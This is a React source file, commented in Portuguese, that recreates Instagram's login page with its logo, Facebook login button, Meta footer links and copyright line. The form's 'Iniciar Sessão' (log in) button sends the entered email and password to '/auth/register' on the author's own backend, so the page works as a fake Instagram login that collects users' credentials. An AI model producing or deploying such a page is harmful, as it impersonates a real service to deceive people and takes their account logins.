import React, { useState } from 'react';
import './index.css';
import api from './assets/ap'; // Certifique-se de que o caminho está correto

function App() {
  // States para armazenar os dados do formulário
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');

  // Função de registro de usuário
  const handleRegister = async (e) => {
    e.preventDefault(); // Evitar que a página seja recarregada

    const user = {
      email,
      password,
    };

    try {
      // Enviando os dados do formulário para a API backend
      const response = await api.post('/auth/register', user);
      setMessage(response.data.msg); // Exibe a mensagem de sucesso
    } catch (error) {
      // Lidando com erros
      setMessage(error.response?.data?.msg || 'Erro ao registrar o usuário.');
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <img src="/i.png" alt="Instagram" className="instagram-logo" />
        <form onSubmit={handleRegister}>
          <input
            type="email"
            placeholder="Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Palavra-passe"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button className="buttoniniciar" type="submit">Iniciar Sessão</button>
        </form>
        <div className="divider">OU</div>
        <button className="facebook-login">
          <img src="/face.png" alt="Facebook" className="facebook-icon" /> {/* Imagem do Facebook */}
          Iniciar sessão com o Facebook
        </button>
        <a href="/forgot-password">Esqueceste-te da palavra-passe?</a>
      </div>
      <div className="signup-box">
        <p>Não tens uma conta? <a href="/register">Regista-te.</a></p>
      </div>
      <div className="app-download">
        <p>Obtém a aplicação.</p>
        <div className="app-stores">
          <img src="/play.png" alt="Google Play" />
          <img src="/micro.png" alt="Microsoft Store" />
        </div>
      </div>
      <footer className="footer">
        <div className="footer-links">
          <a href="/about">Meta</a>
          <a href="/jobs">Empregos</a>
          <a href="/help">Ajuda</a>
          <a href="/api">API</a>
          <a href="/privacy">Privacidade</a>
          <a href="/terms">Termos</a>
          <a href="/locations">Localizações</a>
          <a href="/instagram-lite">Instagram Lite</a>
          <a href="/threads">Threads</a>
          <a href="/contact-upload">Carregamento de contactos e não utilizadores</a>
          <a href="/verification">Verificação</a>
        </div>
        <div className="language">
         
        </div>
        <div className="copyright">
          <p>© 2025 Instagram from Meta</p>
        </div>
      </footer>
      {message && <p className="message">{message}</p>} {/* Exibe a mensagem de sucesso ou erro */}
    </div>
  );
}

export default App;